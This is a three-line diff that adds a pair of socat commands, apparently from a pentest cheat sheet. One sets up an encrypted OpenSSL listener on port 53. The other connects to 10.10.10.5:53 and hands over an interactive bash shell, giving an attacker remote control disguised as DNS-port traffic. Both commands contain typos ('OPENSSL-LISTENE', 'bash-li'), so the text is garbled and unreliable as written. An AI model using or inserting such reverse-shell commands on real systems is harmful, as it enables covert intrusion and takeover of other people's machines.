@@ -1,0 +1,3 @@
+socat OPENSSL-LISTENE:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+
+socat OPENSSL:10.10.10.5:53,verify=0 - EXEC:"bash-li",pty,stderr,sigint,setsid,sane
